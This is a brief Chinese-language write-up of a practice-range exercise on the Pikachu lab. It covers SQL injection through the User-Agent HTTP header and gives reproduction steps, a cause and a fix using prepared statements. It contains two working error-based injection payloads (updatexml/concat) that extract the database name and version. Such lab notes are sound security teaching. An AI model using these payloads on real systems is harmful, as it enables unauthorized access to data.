# Pikachu | SQL注入 HTTP头注入
## 一、漏洞简介
后端把HTTP请求头（user-agent）存入数据库，拼接SQL，存在注入。
## 二、环境信息
靶场地址：http://127.0.0.1/pikachu/
关卡路径：/vul/sqli/sqli_header.php
## 三、复现步骤
1. BP抓包，修改User-Agent请求头
2. 添加payload：`' and updatexml(1,concat(0x7e,database(),0x7e),1) -- `
3. 发送数据包，页面报错带出数据库信息
## 四、Payload
User-Agent: `' and updatexml(1,concat(0x7e,version(),0x7e),1) -- `
## 五、漏洞原理
日志记录功能，把UA直接插入insert语句。
## 六、修复方案
所有http头参数都要过滤，预编译。
## 七、总结
不要信任HTTP请求头，请求头也可以可控注入。